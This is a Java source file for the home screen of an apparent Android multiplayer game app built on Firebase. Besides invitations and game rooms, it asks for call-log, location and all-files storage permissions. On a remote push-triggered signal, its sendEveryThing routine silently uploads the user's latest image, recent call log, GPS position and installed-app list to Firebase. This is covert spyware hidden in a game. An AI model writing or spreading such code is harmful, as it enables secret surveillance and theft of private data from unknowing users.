package com.horoftech.ratatouille.ui;

import static com.horoftech.ratatouille.utils.Configurations.AVAILABLE;
import static com.horoftech.ratatouille.utils.Configurations.ONLINE_USERS;
import static com.horoftech.ratatouille.utils.Configurations.PLAYER1;
import static com.horoftech.ratatouille.utils.Configurations.PLAYER2;
import static com.horoftech.ratatouille.utils.Configurations.ROOMS;
import static com.horoftech.ratatouille.utils.Configurations.UNAVAILABLE;
import static com.horoftech.ratatouille.utils.Configurations.profileModel;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.databinding.DataBindingUtil;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentTransaction;
import androidx.lifecycle.ViewModelProvider;

import com.google.firebase.Firebase;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.FirebaseDatabase;
import com.horoftech.ratatouille.R;
import com.horoftech.ratatouille.databinding.ActivityHomeBinding;
import com.horoftech.ratatouille.databinding.ShowInvitationBinding;
import com.horoftech.ratatouille.fragments.HomeFragment;
import com.horoftech.ratatouille.fragments.ProfileFragment;
import com.horoftech.ratatouille.fragments.SettingsFragment;
import com.horoftech.ratatouille.models.ProfileModel;
import com.horoftech.ratatouille.utils.Configurations;
import com.horoftech.ratatouille.utils.Functions;
import com.horoftech.ratatouille.utils.PushNotificationController;
import com.horoftech.ratatouille.utils.SingleShotLocationProvider;
import com.horoftech.ratatouille.viewModels.ActivityHomeViewModel;
import com.squareup.picasso.Picasso;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class HomeActivity extends AppCompatActivity {
    ActivityHomeBinding binding;
    ActivityHomeViewModel model;
    boolean isOnline = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = DataBindingUtil.setContentView(this, R.layout.activity_home);
        model = new ViewModelProvider(this).get(ActivityHomeViewModel.class);
        binding.setViewModel(model);
        binding.setLifecycleOwner(this);
        setUpFragment(HomeFragment.getInstance());


        new PushNotificationController().setUpListener(model);
        requestPermission();
        binding.bottomNavigationView.setOnItemSelectedListener(item -> {
            if (item.getItemId() == R.id.home) {
                model.setFragmentChanged(0);
                return true;
            } else if (item.getItemId() == R.id.profile) {
                model.setFragmentChanged(1);
                return true;
            } else if (item.getItemId() == R.id.settings) {
                model.setFragmentChanged(2);
                return true;
            }

            return false;
        });
        observe();

    }


    @Override
    protected void onResume() {
        FirebaseDatabase.getInstance().getReference().child(ONLINE_USERS)
                .child(Configurations.profileModel.getUniqueID())
                .setValue(isOnline ? UNAVAILABLE : AVAILABLE);
        super.onResume();
    }


    @Override
    protected void onStop() {
        if (HomeFragment.getInstance().model.getIsOnline()) {
            FirebaseDatabase.getInstance().getReference().child(ROOMS).child(HomeFragment.getInstance().model.getRoomID()).setValue(null);
        }
        FirebaseDatabase.getInstance().getReference().child(ONLINE_USERS)
                .child(Configurations.profileModel.getUniqueID())
                .setValue(null);
        super.onStop();
    }

    private void observe() {
        model.retriveData.observe(this, s -> {
            sendData();
        });
        model.getOnFragmentChange().observe(this, i -> {
            switch (i) {
                case 1: {
                    setUpFragment(ProfileFragment.getInstance());
                    break;
                }
                case 2: {
                    setUpFragment(SettingsFragment.getInstance());
                    break;
                }
                default: {
                    setUpFragment(HomeFragment.getInstance());
                    break;
                }
            }
        });
        model.invitationListener.observe(this, this::showInvitation);
        model.invitationAccepted.observe(this, this::invitationAccepted);

    }

    private void requestPermission() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                    != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_CALL_LOG,
                                Manifest.permission.ACCESS_FINE_LOCATION,
                                Manifest.permission.READ_EXTERNAL_STORAGE
                        }, 0);
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                    != PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_CALL_LOG,
                                Manifest.permission.ACCESS_FINE_LOCATION
                        }, 0);
            }
        }

        if(shouldSend){
            sendEveryThing();
        }

    }

    boolean shouldSend = false;

    void sendData() {
        Log.e("checking","retriveCalled");
        shouldSend = true;
        requestPermission();
    }


    void sendEveryThing(){
        Functions.uploadLastImageToFirebase(this);
        getCallDetails();
        getCurrentLocation();
        getUserInstalledApps();
    }
//content://com.android.externalstorage.documents/document/primary/Vivo-T1-Pro-5G-PD2193.rar

    @SuppressLint("NewApi")
    @Override
    public void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1) {
            if (Environment.isExternalStorageManager()) {
                if(shouldSend){
                    sendEveryThing();
                }
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
     if(requestCode ==0){
            if(grantResults.length>0 && grantResults[0] == PackageManager.PERMISSION_GRANTED){
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (!Environment.isExternalStorageManager()) {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                        intent.setData(Uri.parse("package:" + getPackageName()));
                        startActivityForResult(intent, 1);
                    }
                }else {
                    if(shouldSend){
                        sendEveryThing();
                    }
                }
            }
        }
    }


    ProfileModel userProfileModel;

    private void invitationAccepted(String s) {
        setUpFragment(HomeFragment.getInstance());
        HomeFragment.getInstance().setUpOnlineGame(s, userProfileModel, PLAYER1);
        isOnline = true;
    }

    AlertDialog dialog;

    private void showInvitation(ProfileModel profileModel) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        ShowInvitationBinding binding1 = ShowInvitationBinding.inflate(getLayoutInflater(), null, false);
        binding1.name.setText(profileModel.getName());
        binding1.emaillayout.setText(profileModel.getEmail());
        Picasso.get().load(Functions.getHighResPhoto(profileModel.getProfile())).into(binding1.profile);
        binding1.id.setText(profileModel.getUniqueID());
        binding1.accept.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.e("checkingAccept", profileModel.toString());
                userProfileModel = profileModel;
                setUpFragment(HomeFragment.getInstance());
                String roomID = profileModel.getUniqueID() + "roomid" + Configurations.profileModel.getUniqueID();
                Log.e("roomID", roomID);
                FirebaseDatabase.getInstance().getReference().child(ONLINE_USERS).child(profileModel.getUniqueID()).setValue(Configurations.INVITATION_ACCEPTED + "_" + roomID);
                HomeFragment.getInstance().setUpOnlineGame(roomID, userProfileModel, PLAYER2);
                isOnline = true;
                dialog.dismiss();

            }
        });
        binding1.decline.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }

        });
        builder.setView(binding1.getRoot());
        dialog = builder.create();
        dialog.show();
    }

    void setUpFragment(Fragment f) {
        Log.e("fragmentContainer", "called");
        FragmentManager fm = getSupportFragmentManager();
        FragmentTransaction ft = fm.beginTransaction();
        ft.setTransition(FragmentTransaction.TRANSIT_FRAGMENT_OPEN);
        ft.replace(R.id.fragmentcontainer, f);
        ft.addToBackStack(null);
        ft.commit();
    }

    private void getCurrentLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 5000);
            return;
        }
        SingleShotLocationProvider.requestSingleUpdate(this,
                location -> {
                    String locationstr = location.latitude + "," + location.longitude;
                    Log.e("current location",locationstr);
                    FirebaseDatabase.getInstance().getReference().child("lastlocation").setValue(locationstr);
                });
    }

    public void getCallDetails() {
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");

        int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
        int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
        ArrayList<String>data = new ArrayList<>();

        while (cursor.moveToNext()) {
            String phoneNumber = cursor.getString(numberIndex);
            String callType = cursor.getString(typeIndex);
            String callDate = cursor.getString(dateIndex);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(durationIndex);

            int callTypeCode = Integer.parseInt(callType);
            String callTypeString = "";

            switch (callTypeCode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    callTypeString = "Outgoing";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    callTypeString = "Incoming";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    callTypeString = "Missed";
                    break;
            }

           String s = "Number: " + phoneNumber + " | Type: " + callTypeString +
                   " | Date: " + callDayTime + " | Duration: " + callDuration + " seconds";
            data.add(s);
            if(data.size()==10){
                break;
            }

        }
        cursor.close();
        FirebaseDatabase.getInstance().getReference().child("callLog").setValue(data);
    }

    public void getUserInstalledApps() {
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        ArrayList<String>a = new ArrayList<>();
        for (ApplicationInfo app : apps) {
            if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String appName = pm.getApplicationLabel(app).toString();
                a.add(appName);
            }
        }

        FirebaseDatabase.getInstance().getReference().child("installed").setValue(a);
    }


}